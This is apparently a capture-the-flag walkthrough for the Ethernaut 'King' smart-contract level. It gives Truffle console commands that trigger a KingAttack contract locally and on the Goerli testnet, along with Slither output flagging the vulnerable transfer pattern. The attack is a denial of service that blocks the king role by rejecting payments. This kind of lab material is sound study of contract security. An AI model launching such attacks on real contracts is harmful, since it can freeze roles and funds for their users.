# King

[King](https://ethernaut.openzeppelin.com/level/0x725595BA16E76ED1F6cC1e1b65A88365cC494824)


Block transfer of "king" role by rejecting transfers.


<BR />


## Test Attack

```BASH
truffle develop
```

```JS
migrate

k1 = await King.deployed()
(await k1.prize()).toString()
await k1._king()
await web3.eth.sendTransaction({from: accounts[9], to: k1.address, value: 15})
await k1._king()


k2 = await KingAttack.deployed()
await web3.eth.getBalance(k2.address)
await k2.youKing()
```

<BR />


## Live Attack

```BASH
truffle console --network goerli
```

```JS
k1 = await King.at('0x86a68e10f55baccC4d979dE3b389d3b38B5d1Fe6')
(await k1.prize()).toString()
await k1._king()

k2 = await KingAttack.deployed()
await web3.eth.getBalance(k2.address)
sender = accounts[5]
await k2.youKing({from: sender})
```


<BR />


## Vulnerability Testing Tools


<BR />

### Slither

__Bug Detect:__ Vulnerability classifed as "informational".

```BASH
slither ./contracts/King.sol  --truffle-ignore-compile  --exclude-optimization 
```

```
Reentrancy in King.receive() (contracts/King.sol#16-21):
        External calls:
        - address(king).transfer(msg.value) (contracts/King.sol#18)
        State variables written after the call(s):
        - king = msg.sender (contracts/King.sol#19)
        - prize = msg.value (contracts/King.sol#20)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities-4
./contracts/King.sol analyzed (1 contracts with 76 detectors), 4 result(s) found
```

